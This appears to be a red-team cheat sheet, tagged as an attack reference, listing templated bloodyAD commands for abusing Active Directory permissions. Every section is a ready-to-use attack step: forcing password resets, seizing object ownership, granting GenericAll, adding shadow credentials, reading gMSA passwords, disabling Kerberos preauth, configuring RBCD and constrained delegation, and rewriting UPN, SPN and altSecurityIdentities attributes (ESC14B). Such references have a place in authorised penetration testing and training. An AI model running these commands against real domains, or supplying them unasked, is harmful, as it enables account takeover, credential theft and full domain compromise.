# bloodyad
#plateform/linux #target/remote #cat/ATTACK

## Set password
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set password '<target_user>' '<new_passwd|Password123!>'
```

## Get writable
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' get writable
```

## Set owner
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set owner '<target_obj>' '<our_acc>'
```

## Add GenericAll
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add genericAll '<target_obj>' '<our_acc>'
```

## Add group member
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add groupMember '<group>' '<member>'
```
## Shadow Creds
```
bloodyAD --host <target> -d <domain>  -u '<user>' -p '<passwd>' add shadowCredentials <target_user>
```

## Enum Deleted User
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' -k get writable --include-del
```

## Restore Deleted User
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' -k set restore <target_name>
```

## ReadGMSAPassword
```
bloodyAD --host <target> -d <domain> -u <user> -p <passwd> get object <target_username> --attr msDS-ManagedPassword
```

## Disable preauth
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add uac '<target_obj>' -f DONT_REQ_PREAUTH
```

## Add RBCD
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add rbcd '<target_obj>' '<service_acc>'
```

## Enable Account
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' remove uac '<account>' -f ACCOUNTDISABLE
```

## TRUSTED_TO_AUTH_FOR_DELEGATION 
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add uac <target_username> -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

## Modify UPN
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set object <old_upn> userPrincipalName -v <new_upn>
```

## Mail Attribute
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set object <target_user> mail -v <newmail@test.local>
```

## Write SPN
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set object <target>servicePrincipalName -v '<domain/meow>'
```

## ESC14B - Modify the altSecurityIdentities attribute
```
bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set object <target_user> altSecurityIdentities -v 'X509:<RFC822>pain@meow.local'
```
